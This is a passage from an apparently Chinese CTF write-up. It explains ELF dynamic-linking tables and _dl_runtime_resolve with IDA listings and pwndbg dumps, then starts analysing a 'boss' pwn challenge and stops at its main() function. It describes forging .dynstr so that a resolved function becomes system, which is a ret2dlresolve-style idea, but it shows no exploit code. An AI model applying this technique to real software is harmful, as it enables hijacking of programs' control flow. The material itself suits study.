<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F10</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">14</span><span class="n">h</span><span class="p">,</span> <span class="mi">7</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_PLTREL</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F20</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">17</span><span class="n">h</span><span class="p">,</span> <span class="mi">4004</span><span class="n">D0h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_JMPREL</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F30</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">7</span><span class="p">,</span> <span class="mi">4004</span><span class="n">A0h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_RELA</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F40</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">8</span><span class="p">,</span> <span class="mi">30</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_RELASZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F50</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">9</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_RELAENT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F60</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFFEh</span><span class="p">,</span> <span class="mi">400470</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_VERNEED</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F70</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFFFh</span><span class="p">,</span> <span class="mi">1</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_VERNEEDNUM</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F80</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFF0h</span><span class="p">,</span> <span class="mi">400468</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_VERSYM</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F90</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span>           <span class="p">;</span> <span class="n">DT_NULL</span>
</code></pre></div></div> <h5 id="注意关注来自deepunkicudt_rel-动态链接重定位表地址dt_symtab-动态链接符号表地址dt_strtab-动态链接字符串表地址dt_init-初始化代码地址dt_fini-结束代码地址">   注意关注（来自deepunk.icu）<br/>   DT_REL 动态链接重定位表地址<br/>   DT_SYMTAB 动态链接符号表地址<br/>   DT_STRTAB 动态链接字符串表地址<br/>   DT_INIT 初始化代码地址<br/>   DT_FINI 结束代码地址<br/></h5> <h5 id="dynstr动态链接中的字符串可以从上面的结构体可以寻址可以看到我们使用的puts我们主要关注函数名字符串比如说在no-relro时可以篡改dynamic中指向该段结构的地址指向提前伪造好的dynstr然后触发某函数的重定位这个函数就被重定位到了伪造段中包含的system字样partial-relro-或者-full-relro时这段内存不可写这种方法就使用不了">   .dynstr，动态链接中的字符串，可以从上面的结构体可以寻址。可以看到我们使用的<code class="language-plaintext highlighter-rouge">puts()</code><br/>   我们主要关注函数名字符串，比如说在<code class="language-plaintext highlighter-rouge">no RELRO</code>时，可以篡改<code class="language-plaintext highlighter-rouge">.dynamic</code>中指向该段结构的地址指向提前伪造好的<code class="language-plaintext highlighter-rouge">.dynstr</code>，然后触发某函数的重定位，这个函数就被重定位到了伪造段中包含的<code class="language-plaintext highlighter-rouge">system</code>字样。<code class="language-plaintext highlighter-rouge">partial RELRO</code> 或者 <code class="language-plaintext highlighter-rouge">full RELRO</code>时，这段内存不可写，这种方法就使用不了。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mo">0000000000400420</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">String</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400420</span> <span class="n">unk_400420</span>      <span class="n">db</span>    <span class="mi">0</span>                 <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">D8</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400420</span>                                         <span class="p">;</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">F0</span><span class="err">↑</span><span class="n">o</span> <span class="p">...</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400421</span> <span class="n">aLibcStartMain</span>  <span class="n">db</span> <span class="err">'</span><span class="n">__libc_start_main</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400421</span>                                         <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">D8</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400433</span> <span class="n">aPuts</span>           <span class="n">db</span> <span class="err">'</span><span class="n">puts</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>             <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">F0</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040043</span><span class="mi">8</span> <span class="n">aLibcSo6</span>        <span class="n">db</span> <span class="err">'</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>        <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400470</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400442</span> <span class="n">aGlibc225</span>       <span class="n">db</span> <span class="err">'</span><span class="n">GLIBC_2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">5</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>      <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="mi">80</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040044</span><span class="n">E</span> <span class="n">aGlibc234</span>       <span class="n">db</span> <span class="err">'</span><span class="n">GLIBC_2</span><span class="p">.</span><span class="mi">34</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>       <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="mi">90</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040045</span><span class="mi">9</span> <span class="n">aGmonStart</span>      <span class="n">db</span> <span class="err">'</span><span class="n">__gmon_start__</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>   <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040040</span><span class="mi">8</span><span class="err">↑</span><span class="n">o</span>
</code></pre></div></div> <h5 id="dynsym这里是一堆符号表结构体还是主要关注函数的结构体">   .dynsym，这里是一堆符号表结构体，还是主要关注函数的结构体</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mo">00000000004003</span><span class="n">C0</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">Symbol</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">C0</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">D8</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="n">offset</span> <span class="n">aLibcStartMain</span> <span class="o">-</span> <span class="n">offset</span> <span class="n">unk_400420</span><span class="p">,</span> <span class="mi">12</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">"__libc_start_main"</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">F0</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="n">offset</span> <span class="n">aPuts</span> <span class="o">-</span> <span class="n">offset</span> <span class="n">unk_400420</span><span class="p">,</span> <span class="mi">12</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">"puts"</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040040</span><span class="mi">8</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="n">offset</span> <span class="n">aGmonStart</span> <span class="o">-</span> <span class="n">offset</span> <span class="n">unk_400420</span><span class="p">,</span> <span class="mi">20</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">"__gmon_start__"</span>
</code></pre></div></div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
	<span class="n">Elf64_Word</span> <span class="n">st_name</span><span class="p">;</span> <span class="cm">/* 存的是.dynstr 中的偏移值 */</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span> <span class="cm">/* 对于导入函数符号而言，它是0x12 */</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span> 
	<span class="n">Elf64_Section</span> <span class="n">st_shndx</span><span class="p">;</span> 
	<span class="n">Elf64_Addr</span> <span class="n">st_value</span><span class="p">;</span> 
	<span class="n">Elf64_Xword</span> <span class="n">st_size</span><span class="p">;</span> 
<span class="p">}</span> <span class="n">Elf64_Sym</span><span class="p">;</span>
<span class="c1">// 对于函数来说，3、4、5、6都是0</span>
</code></pre></div></div> <h5 id="reldyndt_rela和relpltdt_jmprel被称为动态链接重定位表reldyn用于修正data和got中的数据引用函数的信息不在这里一般也不是很关注这个relplt这个段和之前的rel_arg直接相关并且用于修正gotplt俗称的got表在32位中rel_arg是用于计算它的偏移64位里直接就是下标deepunkicu">   .rel.dyn（DT_RELA）和.rel.plt（DT_JMPREL），被称为<code class="language-plaintext highlighter-rouge">动态链接重定位表</code><br/>   .rel.dyn,用于修正<code class="language-plaintext highlighter-rouge">.data</code>和<code class="language-plaintext highlighter-rouge">.got</code>中的数据引用，函数的信息不在这里，一般也不是很关注这个<br/>   .rel.plt这个段和之前的<code class="language-plaintext highlighter-rouge">rel_arg</code>直接相关，并且用于修正<code class="language-plaintext highlighter-rouge">.got.plt</code>（俗称的got表）。在32位中<code class="language-plaintext highlighter-rouge">rel_arg</code>是用于计算它的偏移，64位里直接就是下标（deepunk.icu）；</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mo">00000000004004</span><span class="n">A0</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">RELA</span> <span class="n">Relocation</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">A0</span>                 <span class="n">Elf64_Rela</span> <span class="o">&lt;</span><span class="mi">403</span><span class="n">FF0h</span><span class="p">,</span> <span class="mi">100000006</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">R_X86_64_GLOB_DAT</span> <span class="n">__libc_start_main</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">B8</span>                 <span class="n">Elf64_Rela</span> <span class="o">&lt;</span><span class="mi">403</span><span class="n">FF8h</span><span class="p">,</span> <span class="mi">300000006</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">R_X86_64_GLOB_DAT</span> <span class="n">__gmon_start__</span>

<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">D0</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">JMPREL</span> <span class="n">Relocation</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">D0</span>                 <span class="n">Elf64_Rela</span> <span class="o">&lt;</span><span class="mi">404018</span><span class="n">h</span><span class="p">,</span> <span class="mi">200000007</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">R_X86_64_JUMP_SLOT</span> <span class="n">puts</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">D0</span> <span class="n">LOAD</span>            <span class="n">ends</span>
</code></pre></div></div> <h5 id="64位和32位的结构体不一样结构体示例对比一下deepunkicu">   64位和32位的结构体不一样，结构体示例对比一下。（deepunk.icu）<br/>   </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
	<span class="n">Elf32_Addr</span> <span class="n">r_offset</span><span class="p">;</span> <span class="cm">/* Address */</span>
	<span class="n">Elf32_Word</span> <span class="n">r_info</span><span class="p">;</span> <span class="cm">/* Relocation type and symbol index */</span>
<span class="p">}</span> <span class="n">Elf32_Rel</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
	<span class="n">Elf64_Addr</span> <span class="n">r_offset</span><span class="p">;</span> <span class="cm">/* Address */</span>
	<span class="n">Elf64_Xword</span> <span class="n">r_info</span><span class="p">;</span> <span class="cm">/* Relocation type and symbol index */</span>
<span class="p">}</span> <span class="n">Elf64_Rel</span><span class="p">;</span>
</code></pre></div></div> <h5 id="rel_arg了解之后再来解决一下上面遗留的link_map结构体可以看到存储的是被链接的文件以及它们对应的dynamic以及加载地址偏移由于-no-pie所以执行文件加载地址是0x0之前push的是执行文件的linkmap也就是第一个">   <code class="language-plaintext highlighter-rouge">rel_arg</code>了解之后，再来解决一下上面遗留的<code class="language-plaintext highlighter-rouge">link_map</code>结构体。可以看到存储的是被链接的文件，以及它们对应的<code class="language-plaintext highlighter-rouge">.dynamic</code>以及加载地址偏移（由于<code class="language-plaintext highlighter-rouge">-no-pie</code>所以执行文件加载地址是<code class="language-plaintext highlighter-rouge">0x0</code>）,之前<code class="language-plaintext highlighter-rouge">push</code>的是执行文件的linkmap，也就是第一个</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Node</span>           <span class="n">Objfile</span>                                         <span class="n">Load</span> <span class="n">Bias</span>      <span class="n">Dynamic</span> <span class="n">Segment</span> 
<span class="mh">0x7ffff7ffe2e0</span> <span class="o">&lt;</span><span class="n">Unknown</span><span class="p">,</span> <span class="n">likely</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">testtable</span><span class="o">/</span><span class="n">lazy_load</span><span class="o">&gt;</span> <span class="mh">0x0</span>            <span class="mh">0x403e20</span>        
<span class="mh">0x7ffff7ffe890</span> <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">1</span>                                 <span class="mh">0x7ffff7fc1000</span> <span class="mh">0x7ffff7fc13a0</span>  
<span class="mh">0x7ffff7fbb160</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>                 <span class="mh">0x7ffff7d83000</span> <span class="mh">0x7ffff7f9cbc0</span>  
<span class="mh">0x7ffff7ffdaf0</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>                     <span class="mh">0x7ffff7fc3000</span> <span class="mh">0x7ffff7ffce80</span> 
</code></pre></div></div> <h5 id="以其中的libcso6为例看看dynamic的结构与执行文件对比一下">   以其中的libc.so.6为例，看看<code class="language-plaintext highlighter-rouge">.dynamic</code>的结构，与执行文件对比一下。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x7ffff7f9cbc0</span>
<span class="mh">0x7ffff7f9cbc0</span><span class="o">:</span> <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000007d69</span>
<span class="mh">0x7ffff7f9cbd0</span><span class="o">:</span> <span class="mh">0x000000000000000e</span>      <span class="mh">0x0000000000007d7e</span>
<span class="mh">0x7ffff7f9cbe0</span><span class="o">:</span> <span class="mh">0x0000000000000019</span>      <span class="mh">0x0000000000216900</span>
<span class="mh">0x7ffff7f9cbf0</span><span class="o">:</span> <span class="mh">0x000000000000001b</span>      <span class="mh">0x0000000000000010</span>
<span class="mh">0x7ffff7f9cc00</span><span class="o">:</span> <span class="mh">0x0000000000000004</span>      <span class="mh">0x00007ffff7f939f8</span>
<span class="mh">0x7ffff7f9cc10</span><span class="o">:</span> <span class="mh">0x000000006ffffef5</span>      <span class="mh">0x00007ffff7d833c8</span>
<span class="mh">0x7ffff7f9cc20</span><span class="o">:</span> <span class="mh">0x0000000000000005</span>      <span class="mh">0x00007ffff7d99650</span>
<span class="mh">0x7ffff7f9cc30</span><span class="o">:</span> <span class="mh">0x0000000000000006</span>      <span class="mh">0x00007ffff7d87ad0</span>
<span class="mh">0x7ffff7f9cc40</span><span class="o">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000007f15</span>
<span class="mh">0x7ffff7f9cc50</span><span class="o">:</span> <span class="mh">0x000000000000000b</span>      <span class="mh">0x0000000000000018</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span>  <span class="mh">0x403e20</span>
<span class="mh">0x403e20</span><span class="o">:</span>       <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000000018</span>
<span class="mh">0x403e30</span><span class="o">:</span>       <span class="mh">0x000000000000000c</span>      <span class="mh">0x0000000000401000</span>
<span class="mh">0x403e40</span><span class="o">:</span>       <span class="mh">0x000000000000000d</span>      <span class="mh">0x000000000040114c</span>
<span class="mh">0x403e50</span><span class="o">:</span>       <span class="mh">0x0000000000000019</span>      <span class="mh">0x0000000000403e10</span>
<span class="mh">0x403e60</span><span class="o">:</span>       <span class="mh">0x000000000000001b</span>      <span class="mh">0x0000000000000008</span>
<span class="mh">0x403e70</span><span class="o">:</span>       <span class="mh">0x000000000000001a</span>      <span class="mh">0x0000000000403e18</span>
<span class="mh">0x403e80</span><span class="o">:</span>       <span class="mh">0x000000000000001c</span>      <span class="mh">0x0000000000000008</span>
<span class="mh">0x403e90</span><span class="o">:</span>       <span class="mh">0x000000006ffffef5</span>      <span class="mh">0x00000000004003a0</span>
<span class="mh">0x403ea0</span><span class="o">:</span>       <span class="mh">0x0000000000000005</span>      <span class="mh">0x0000000000400420</span>
<span class="mh">0x403eb0</span><span class="o">:</span>       <span class="mh">0x0000000000000006</span>      <span class="mh">0x00000000004003c0</span>
</code></pre></div></div> <h5 id="可以看到两个链接文件的elf64_dyn的类型基本一致说明两个文件的有关动态链接的结构相似的后面所指向的诸如dynstrdynsymrelplt地址是不一样的是各自的真实地址">   可以看到两个链接文件的ELF64_Dyn的类型基本一致，说明两个文件的有关动态链接的结构相似的，后面所指向的诸如<code class="language-plaintext highlighter-rouge">.dynstr</code>、<code class="language-plaintext highlighter-rouge">.dynsym</code>、<code class="language-plaintext highlighter-rouge">.rel.plt</code>地址是不一样的，是各自的真实地址。</h5> <h5 id="现在简单解释感性的理解_dl_runtime_reslovelink_map-rel_arg是如何借助这些结构重定位某一个函数第一步借助link_map找到dynamic的加载地址进而找到relplt的位置第二步借助rel_arg作为偏移或者下标找到的relplt中指定函数的动态链接重定位表第三步取出动态链接重定位表中的r_offset用于找到gotplt的位置既got表第四步取出动态链接重定位表中的r_info找到函数的动态链接重定位表取出其中的st_name既dynstr中的函数名字符">   现在简单解释（感性的理解）<code class="language-plaintext highlighter-rouge">_dl_runtime_reslove(link_map, rel_arg)</code>是如何借助这些结构重定位某一个函数。<br/>   第一步，借助<code class="language-plaintext highlighter-rouge">link_map</code>找到<code class="language-plaintext highlighter-rouge">.dynamic</code>的加载地址，进而找到<code class="language-plaintext highlighter-rouge">.rel.plt</code>的位置。<br/>   第二步，借助<code class="language-plaintext highlighter-rouge">rel_arg</code>（作为偏移或者下标），找到的<code class="language-plaintext highlighter-rouge">.rel.plt</code>中指定函数的<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>。<br/>   第三步，取出<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>中的<code class="language-plaintext highlighter-rouge">r_offset</code>，用于找到<code class="language-plaintext highlighter-rouge">.got.plt</code>的位置（既got表）<br/>   第四步，取出<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>中的<code class="language-plaintext highlighter-rouge">r_info</code>，找到函数的<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>，取出其中的<code class="language-plaintext highlighter-rouge">st_name</code>，既<code class="language-plaintext highlighter-rouge">.dynstr</code>中的函数名字符。</h5> <h3 id="一点补充有关-fcf-protection">一点补充（有关-fcf-protection）</h3> <h5 id="这是ubuntu的gcc默认开启的一项保护措施在第一次函数调用时不会按照上面的流程而是直接到glibc中详情参考httpswwwsoinsidecomquestionaenbeapagmmbfzpviveobc">   这是ubuntu的gcc默认开启的一项保护措施，在第一次函数调用时，不会按照上面的流程，而是直接到glibc中，详情参考https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc</h5> <h3 id="攻击手段">攻击手段</h3> <h5 id="现在来具体分析一下这道boss题怎么做由于给出了source-code所以我们自己编译一个方便调试的执行文件并且把随机数那一部分去掉指令和上面那个demo一样">   现在来具体分析一下这道boss题怎么做。由于给出了source code所以我们自己编译一个方便调试的执行文件，并且把随机数那一部分去掉，指令和上面那个demo一样<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">worktable</span><span class="o">/</span><span class="n">cnss2024</span><span class="o">/</span><span class="n">boss</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">attachment</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>       <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>      <span class="n">Partial</span> <span class="n">RELRO</span>   <span class="o">&lt;---------</span>
    <span class="n">Stack</span><span class="o">:</span>      <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>         <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>        <span class="n">PIE</span> <span class="n">enabled</span>
    <span class="n">SHSTK</span><span class="o">:</span>      <span class="n">Enabled</span>
    <span class="n">IBT</span><span class="o">:</span>        <span class="n">Enabled</span>
</code></pre></div></div> <h5 id="首先来到init函数passwd指向一个mmap出来的空间passwd本身在bss的最高位置然后在这个空间中写入随机数最后把前八位换成固定的deadbeef字符串这样总共就有0x10个已写入字符">   首先来到<code class="language-plaintext highlighter-rouge">init()</code>函数，<code class="language-plaintext highlighter-rouge">passwd</code>指向一个<code class="language-plaintext highlighter-rouge">mmap()</code>出来的空间，<code class="language-plaintext highlighter-rouge">passwd</code>本身在<code class="language-plaintext highlighter-rouge">.bss</code>的最高位置。然后在这个空间中写入随机数，最后把前八位换成固定的<code class="language-plaintext highlighter-rouge">deadbeef</code>字符串，这样总共就有0x10个已写入字符。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">_Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">passwd</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span> <span class="s">"deadbeef"</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="动态调试一下发现多划分了0x2000的长度">   动态调试一下，发现多划分了0x2000的长度。<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x4040A0</span> 
<span class="mh">0x4040a0</span> <span class="o">&lt;</span><span class="n">passwd</span><span class="o">&gt;:</span>      <span class="mh">0x00007ffff7fb9000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040b0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040c0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040d0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040e0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
<span class="mh">0x7ffff7fb9000</span>     <span class="mh">0x7ffff7fbd000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">4000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7ffff7fb9</span><span class="p">]</span>
</code></pre></div></div> <h5 id="再查看一下linkmap的地址">   再查看一下linkmap的地址，</h5> <h5 id="再看看mainread_num就是atoll">   再看看<code class="language-plaintext highlighter-rouge">main()</code>，<code class="language-plaintext highlighter-rouge">read_num()</code>就是<code class="language-plaintext highlighter-rouge">atoll()</code>。<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
    <span class="n">init</span><span class="p">();</span>

